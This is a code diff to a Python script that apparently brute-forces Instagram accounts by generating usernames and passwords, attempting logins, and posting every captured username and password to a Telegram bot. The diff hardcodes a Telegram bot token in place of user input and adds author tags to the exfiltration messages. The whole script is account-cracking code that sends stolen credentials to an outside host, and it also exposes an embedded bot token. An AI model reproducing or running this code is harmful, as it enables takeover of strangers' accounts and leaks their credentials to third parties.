@@ -6,7 +6,7 @@ E = '\033[1;31m'
 G = '\033[1;32m'
 def HsEyUn():
 	
-	token = input(G+'Enter Token :')
+	token = "6957451652:AAFdnslwr91iAl8CS483666SXOfNf--aW1w"
 	id = input(G+'Enter Id : ')
 	while True:
 		us3 = 'qwertyuiopasdf_ghjklzxcvbnm'
@@ -38,7 +38,7 @@ def HsEyUn():
 		
 		if "rate_limit_error" in reqq.text:
 			print (G+f"Kid -13 Ban : {usr}:{t}")
-			tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 BaN -13 ð¥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = =')
+			tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 BaN -13 ð¥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = = \n by : @t_0mm')
 			a = requests.post(tlg)
 			open("Acconat.txt","a").write(f"Band >> {usr}:{t}\n")
 			
@@ -46,12 +46,12 @@ def HsEyUn():
 			print(E+f"Error Password : {usr}:{t}")
 		elif 'checkpoint_challenge_required' in reqq.text:
 			print (G+f"Checkpoint : {usr}:{t}")
-			tlgg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 ð¥\n = = = = = = = = = = = =\n USER : {username}\n PASS : {password}\n = = = = = = = = = = = =')
+			tlgg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 ð¥\n = = = = = = = = = = = =\n USER : {username}\n PASS : {password}\n = = = = = = = = = = = = \n by : @t_0mm')
 			a = requests.post(tlgg)
 			open("Acconat.txt","a").write(f" Chckpoint >> {usr}:{t}\n")
 		
 		else:
-			print(G+f"Fall Login ! : {usr}:{t}")
-			tlggg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 ð¥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = = / by : @t_0mm')
+			print(G+f"secure Login ! : {usr}:{t}")
+			tlggg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=YoU GeT InStA 4 ð¥\n = = = = = = = = = = = =\n USER : {usr}\n PASS : {t}\n = = = = = = = = = = = = \n by : @t_0mm')
 			a = requests.post(tlggg)
 HsEyUn()
